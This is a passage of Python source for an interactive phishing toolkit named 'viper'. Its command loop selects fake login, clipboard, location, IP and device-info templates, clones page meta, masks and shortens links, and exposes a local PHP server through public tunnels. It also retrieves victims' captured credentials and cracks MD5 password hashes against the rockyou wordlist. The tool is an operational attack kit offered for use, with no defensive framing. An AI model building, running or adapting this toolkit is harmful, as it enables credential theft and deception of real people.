    elif template.startswith('templates/clipboard/') or template.startswith('templates/location/') or template.startswith('templates/ip/') or template.startswith('templates/deviceinfo/') or template.startswith('default'):
        file_word = "index"
    else:
        redirect = None
        print(f'{info}Redirect URL Not needed for current template')
        replace_json('redirect', redirect)
        return

    if site_move is False:
        print(f"{uninfo}No, new site selected! After setting redir url site movement would change settings!")
        option = input(f"{ask}Do you really want to set redirect url without on old site {red}[{blue}Yes/No{red}]> {green}")
        if option in ['Yes', 'yes', 'Y', 'y']:
            print(f"{uninfo}Proceeding...")
            redir_word = get_content('$url = "', '"; #', f'{site_dir}/{file_word}.php')
            if redir_word is None or redir_word == "":
                redir_word = get_content(">window.location.replace('", "');</", f'{site_dir}/{file_word}.php')
            pass
        else:
            print(f"{success}Process Canceled!")
            return False
    redirect_url = redirect_url.replace('set redirect', '').replace(' ', '')
    if not redirect_url.startswith('http'):
        print(f'{error}Invalid URL')
        return False

    if redirect_url == "":
        redirect = 'https://youtube.com'
        replace_data(redir_word, redirect, f"{site_dir}/{file_word}.php")
        print(f'{success}{yellow}Redirect URL default site is set as default!')
    else:
        redirect = redirect_url
        replace_data(redir_word, redirect_url, f"{site_dir}/{file_word}.php")
        print(f"{success}Redirection parameters updated successfully!")
    replace_json('redirect', redirect)
    print(f'set redirect => {redirect_url}')
def set_port(port:str):
    port = port.replace('set port', '').replace(' ', '')
    try:
        int(port)
    except:
        print(f'{error}The port value is missing')
    else:
        if int(port)>11:
            replace_json('port', str(port))
            print(f'set port => {port}')
        else:
            print(f'{bold_white}The port must be valid')
def hashcrack(pwd_hash, hash_file='rockyou.txt', reinforce=False):
    try:
        p_file = open(hash_file, 'r', encoding='latin-1')
    except FileNotFoundError:
        print(error,f'File "{hash_file}" not found')
        return
    # It's better to add hashes next to the word, so next time we can check if the pwd_hash exists in file
    os.makedirs('wordlists', exist_ok=True)
    if not os.path.exists(f'wordlists/{hash_file}') or reinforce:
        # total_units = sum(1 for _ in p_file)
        with open(hash_file, 'r', encoding='latin-1') as infile, \
                open(f'wordlists/{hash_file}', 'w', encoding='utf-8') as outfile:
            # n = 0
            print(f'{blue}Please wait patiently...',end='')
            for word in infile:
                # n += 1
                word = word.strip()
                if not word:
                    continue

                hash_val = hashlib.md5(word.encode('utf-8')).hexdigest()
                try:
                    outfile.write(f"{word} ,HIAC {hash_val}\n")
                except KeyboardInterrupt:
                    outfile.close()
                    print(infile, f'Stopped hashing')
                    break
                """# Calculate percentage progress
                percentage = min(100, round((n / total_units) * 100))

                # Number of blocks in bar (max 50)
                num_blocks = min(50, round((n / total_units) * 50))

                # Choose color for loaded part: red if not done, green if done
                if percentage < 100:
                    load_color = '\033[1;91m'  # Bright Red
                else:
                    load_color = '\033[1;92m'  # Bright Green

                # Construct the bar: colored blocks + white dashes
                bar = (load_color + '■' * num_blocks + '\033[0;97m' + bold_white + '■' * (50 - num_blocks) + '\033[0m')

                # Print progress bar with carriage return to overwrite the line
                print(f"\r\033[1;34mHashing File {percentage:3}% {n}/{total_units} \033[0m[{bar}]", end='',
                      flush=True)""" # Makes Code Slow because of continuous calculation in percentage
            infile.close()
            outfile.close()
            print('Done')

    with open(f'wordlists/{hash_file}', 'r', encoding='utf-8') as file:
        for line_number, line in enumerate(file):
            if f",HIAC {pwd_hash}" in line:
                print(info,f"Hash Found: {bold_blue}{line.strip().split(' ,HIAC')[0]}"
                           f" {bold_yellow}({bold_white}{hash_file}:{white}{line_number}{bold_yellow})")
                return

        print(uninfo,f'The Hash is not in the file {magenta}"{hash_file}"{yellow}! {white} Try changing the file')
        return

    # pass_found = 0
    # n = 0
    # total_units = len(open(hash_file, 'r', encoding='latin-1').read().splitlines())
    # try:
    #     for word in p_file:
    #         n += 1
    #         percentage = min(100, round((n / total_units) * 100))  # Ensure maximum of 100%
    #         if percentage < 100:
    #             load_color = '\033[1;91m-'
    #         else:
    #             load_color = '\033[1;92m-'
    #         num_blocks = min(50, round((n / total_units) * 50))  # Ensure maximum of 50 blocks
    #         bar = ('\033[1;32m' + f'{load_color}' * num_blocks + '' + '\033[0;97m-' * (
    #                 50 - num_blocks))  # Green for loaded and white for unloaded
    #
    #         print(
    #             f"\r\033[1;34mCracking Combinations {percentage}% {n}/{total_units} \033[00m[{bar}\033[0m]",
    #             end='', flush=True)  # Cyan text
    #
    #         enc_word = word.encode('utf-8')
    #         hash_word = hashlib.md5(enc_word.strip())
    #         digest = hash_word.hexdigest()
    #
    #         if digest == pwd_hash:
    #             print("\nCracked Hash:", word.strip())
    #             pass_found = 1
    #             break
    # except KeyboardInterrupt:
    #     pass_found = 1
    #     print('\nProcess Breaked!')
    # if not pass_found:
    #     print('\nfailed to crack hash!')
def listener(message):
    print(f"\n{bold_magenta}From (email): {bold_white}{message['from']['address']}")
    print(f"\n{bold_magenta}From (name): {bold_white}{message['from']['name']}")
    print(f"{bold_magenta}Subject: {bold_white}{message['subject']}")
    content = message['text'] if message['text'] else message['html']
    print(f"{bold_magenta}-------Content----\n"
          f"{bold_white}{content}"
          f"{bold_magenta}\n--------------------")
    #print(f'{yellow}to escape click CTRL-C')
    return KeyboardInterrupt

def search(command):
    try:
        thresh = 0
        # Extract threshold value if present
        if 'thresh' in command.lower():
            thresh_part = command.split('thresh')[1]
            if '=' in thresh_part:
                thresh = int(thresh_part.replace(' ', '').split('=')[1])
            else:
                raise ValueError("Invalid threshold syntax")

        # Split the command into parts
        path_parts = command.split(' ')
        if len(path_parts) >= 3:
            if 'thresh' not in path_parts[2]:
                path = path_parts[1]
                search_word = path_parts[2]
            else:
                path = path_parts[1]
                search_word = os.path.basename(path)
                path = path.rsplit('/', 1)[0]  # Extract the directory from the path
        elif len(path_parts) == 2:
            path = path_parts[1]
            search_word = os.path.basename(path)
            path = path.rsplit('/', 1)[0]  # Extract the directory from the path
        else:
            print("INVALID SYNTAX")
            raise Exception("Invalid Syntax!")

        # Validate the path exists
        if not os.path.exists(path):
            print(f"Error: The specified path '{path}' does not exist")
            return

        # Perform the search
        for file in os.listdir(path):
            if search_word in file and len(search_word) > 0:
                if thresh == 1:  # Check if the file starts with the search word
                    if file.startswith(search_word):
                        highlighted = os.path.join(path,file.replace(search_word, f"\033[1;32m{search_word}\033[0m"))  # Bold green highlight
                        print(f"\033[1;33m => {no_clr}{highlighted}")  # Yellow arrow
                else:  # Check if the file contains the search word
                    highlighted = os.path.join(path,file.replace(search_word, f"\033[1;32m{search_word}\033[0m"))  # Bold green highlight
                    print(f"\033[1;33m => {no_clr}{highlighted}")  # Yellow arrow

    except ValueError as e:
        print(f"Error: {e}")
        print(f"\033[35mSyntax: (\033[0msearch \033[33m[path] [search word]\033[35m)\033[0m")
        print(f"\033[35m        (\033[0msearch \033[33m[path/to/file/matching word]\033[35m)\033[0m")
        print("\033[35m        (\033[0msearch \033[33m{ANY OF ABOVE FORMAT} thresh=[0,1]\033[35m)\033[0m")
        print(f"Thresh 0 will check for the search word anywhere in the file name, and 1 will check at the start!")
    except Exception as e:
        print(f"Error: {e}")


help_commands = {
    "clear/cls": "Clears the Display",
    "exit": "Ends the program",
    "list": ['Use with following', {'-all': 'Lists All templates',
                                    'templates/login/': 'Lists specific templates in login class',},
             'Examples:-'
             f'\n{(" "*12)} list -all'
             f'\n{(" "*12)} list templates/login/'
             f'\n{(" "*12)} list [address (i.e templates/login)]'],
    "select": ['Use with following', {'template [template address]': "Selects template to be hosted"},
               'Examples:-'
               f'\n{(" "*14)} select template /templates/login/google'],
    "show": ['Use With following', {'options': 'Displays the selected option, selected by select/set cmd'},
             'Examples:-'
             f'\n{(" "*12)} show options'],
    "set": ['Use with following parameters',
            {'redirect': "Sets redirection link for page",
             "port": "Sets port for php server",
             "meta": "Sets meta for the fake page. Used to correct layout of copy page",
             "mask": "Sets mask for masked link",
             "site": "Sets the selected template to publishing folder",
             "DailyNews==[false/true]": "Weather to update daily news whenever logo refreshes"},
            "Examples:-"
            f"\n{(' '*11)} set redirect https://example.com"
            f"\n{(' '*11)} set port 1452"
            f"\n{(' '*11)} set meta https://example.com"
            f"\n{(' '*11)} set mask the-best-and-safe-website"
            f"\n{(' '*11)} set site"
            f"\n{(' '*11)} set DailyNews==false/true"],
    'shrtn [link]': "Shortens the given link",
    "loclx-setup": "Setup for loclx account",
    'ssh-setup': "Setup for ssh account",
    'phpserver': "Run the php server",
    'lookup [IP_ADDR]': 'Provides Detailed info for the IP Addr',
    "urlinfo": 'Return with the generated URLS',
    'creds': "Return credentials",
    "tunneling": ["Use with following sub-options",
                  {"service [on/off]": "Toggles the tunneling service"},
                  'Examples:-'
                  f'\n{(" "*17)} tunneling.service [on/off]'],
    'hashcrack [md5_hash] [filename]': ['Available Options', {'-r (Optional)': "Rehashes the specified file again"},
                                        'Examples:-'
                                        f'\n{" "*38} hashcrack [md5 hash] [filename (optional)] -r(optional)'],
    'mailbox [on/off]': 'Toggles mailbox on/off. You will receive emails automaitcally',
    'kill': 'Stops every running services.'
}
def show_help():
    for command in help_commands:
        info_comd = help_commands.get(command)
        if type(info_comd) == str:
            print(f" {bold_yellow}{command} {red}: {white}{info_comd}")
        else:
            print(f' {bold_yellow}{command} {red}: {white}{info_comd[0]}')
            for sub_command in info_comd[1]:
                sub_command_info = info_comd[1].get(sub_command)
                print((' ' * len(command)) + f"   {bold_red}>{cyan}{sub_command} {red}:- {white}{sub_command_info}")
            print((' ' * len(command)) + f"{white}{info_comd[2]}")

def execute(command):
    global mail
    command = command
    if "clear" in command.lower() or 'cls' in command.lower():
        clear()
        banner(news=False)
        print("\n\n")
    elif 'exit' in command.lower():
        killer()
        # Restore original settings
        if 'nt' not in os.name:
            readline.clear_history()
            readline.set_history_length(100)  # Adjust the history length as needed
        exit()
    elif command.lower().startswith('list '):
        if ' -all' in command.lower():
            list_templates()
        else:
            list_templates(command.lower())
    elif command.lower().startswith('select'):
        if 'select template' in command.lower():
            select_template(command.lower())

        else:
            print(f"{error}No valid parameter/s to select!")
    elif command.lower().startswith('search '):
        search(command)
    elif command.lower().startswith('show '):
        if 'options' in command.lower():
            show_options()
    elif command.lower().startswith('set'):
        if 'redirect' in command.lower():
            set_redirect(command.lower())
        elif 'port' in command.lower():
            set_port(command.lower())
        elif 'meta' in command.lower():
            set_meta(command.lower())
        elif "mask" in command.lower():
            command = command.lower().replace('set mask', '').replace(' ', '')
            if command.lower() != "" or command.lower() is not None:
                command = command.replace('/', '-').replace('\\', '-').replace(',', '-').replace('.', '-').replace('@', '-at-')
                replace_json('mask', command.lower())
                print(f"{info}Mask Parameter/s Sucessfully Updated!")
            else:
                print(f"{uninfo}Unable to update mask parameters!")
        elif "site" in command.lower():
            site_manager(template)
        elif "dailynews" in command.lower():
            command = command.replace(' ','')
            if 'dailynews=false' in command.lower():
                replace_json('dailyNews', False)
                print(f'{nc}set dailyNews => False')
            elif 'dailynews=true' in command.lower():
                replace_json('dailyNews', True)
                print(f'{nc}set dailyNews => True')
            else:
                print(f'{error}Invalid Value "{command.lower().replace("setdailynews=", "")}" given to set. Possible '
                      f'params: [False, True]')
        else:
            print(f'{yellow}Invalid Value Given to set!')
    elif command.lower().startswith('shrtn'):
        shortener = random.choice(['shrtco', 'is-gd', 'tiny-url'])
        shorten(shortener=shortener, url=command.lower())
    elif command.lower().startswith('loclx-setup'):
        lx_token()
    elif command.lower().startswith('ssh-setup'):
        ssh_key()
    elif command.lower().startswith('lookup'):
        addr = command.lower().replace('lookup', '').replace(' ', '')
        lookup(addr)
    elif command.lower().startswith('phpserver'):
        server = php_server()
        if not server:
            print(f"{error}PHP Server was unable to start! Please try again.")
    elif 'tunneling.service' in command.lower():
        if 'on' in command.lower():
            try:
                res = requests.get(f'http://127.0.0.1:{port}', headers={"comment":"This was url check by Viper"})
            except Exception as e:
                print(f"{white}There is a problem. Tunnels cant be configured: {red}{e}")
            else:
                if int(res.status_code) == 404:
                    print(f"{error}Your Port is unresponsive,{white} please check the port and try again")
                else:
                    tunnel = tunneler()
                    if not tunnel:
                        print(f"{error}Further Process Canceled!\n{uninfo}Type kill to terminate other processes.")
                    if tunnel:
                        replace_json('tunneling_service', True)
                    else:
                        replace_json('tunneling_service', False)
        elif 'off' in command.lower():
            stat = close_tunnels()
            if stat:
                print(f"{info}Tunneling Turned off successfully")
            else:
                print(f"{error}Something is forcing tunnel to stop or the tunnel is not running!")
        else:
            print(f"{error}No Valid arguments supplied to {white}tunneling{yellow}.{magenta}service{yellow}!")
            print(f"{info}{white}Possible Arguments:\n\t\t{success.replace('√', '1')}On      {success.replace('√', '2')}Off")
    elif command.lower().startswith('urlinfo'):
        if lx_url != None:
            url_manager(lx_url, "Loclxpose", mask)
        if lhr_url != None:
            url_manager(lhr_url, "LocalHostRun", mask)
        if cf_url != None:
            url_manager(cf_url, "CloudFlare", mask)
        if svo_url != None:
            url_manager(svo_url, "Serveo", mask)
    elif command.lower().startswith('creds'):
        get_creds(True)
    elif command.lower().startswith('hashcrack'):
        cline = command.lower().split(' ')
        if len(cline) > 1 and len(cline[1]) == 32:
            hashed_pwd = cline[1]
            re_create = False
            if len(cline) > 2:
                file = cline[2]
                if ('-r' in cline[2] and not os.path.exists(cline[2])):
                    if not os.path.exists(cline[2]):
                        file = 'rockyou.txt'
                    re_create = True
                elif len(cline) > 3:
                    re_create = True
            else:
                file = 'rockyou.txt'


            hashcrack(hashed_pwd, file, reinforce=re_create)
        else:
            print(f'Invalid Argument supplied to hashcrack\n{blue}Usage: {green}hashcrack '
                  f'[{white}md5_hash{green} ({red}required{green})] [{white}file {green}({yellow}not required{green})]')
    elif command.lower().startswith('mailbox'):
        try:
            if 'on' in command.lower():
                if not tempMail:
                    mail = Email()
                    replace_json('tempMail', True)
                    domain = mail.domain
                    mail.register()
                    password = mail.password
                    email = mail.address

                    print(f'Email:  {email}')
                    print(f'Password: {password}')
                    print(f'Domain: {domain}')

                    # Start listening for new emails
                    mail.start(listener)
                    print("\nWaiting for new emails...")
                else:
                    print('Already Created email')
            elif 'off' in command.lower():
                if tempMail:
                    mail.delete()
                    mail.stop()
                    replace_json('tempMail', False)
                    print('Deleted!')
                else:
                    print('No mail Created!')
            elif ' inbox' in command.lower():
                if tempMail:
                    inbox = mail.message_ids
                    for _mails in inbox:
                        __data = ''
                        for __d in _mails:
                            __data += f"{__d}: {_mails[__d]}"
                        show_file_data(data=__data, file=False)
        except Exception:
            print('Looks Like there is no internet connec\tion ?')
    elif command.lower().startswith('kill'):
        killer()
    elif command.lower().replace(' ', '') == 'help':
        show_help()


    else:
        if not str(command).isspace() and command != "":
            print(f"{bold_red}exec: {bold_blue}{command}{nc}")
            os.system(command)


if __name__ == "__main__":
    clear()
    banner()
    print("\n\n")
    command = ''
    while True:
        update()
        message = f"{bold_white}viper {blue}({bold_red}{template}{blue}){bold_white} > {no_clr}"

        try:
            command = input(message)
        except KeyboardInterrupt:
            print(f"{uninfo}Keyboard Interrupt found! Type 'exit' to quit.")
        else:
            try:
                execute(command)
            except KeyboardInterrupt:
                print(f"{uninfo}Keyboard Interrupt found! Type 'exit' to quit.")



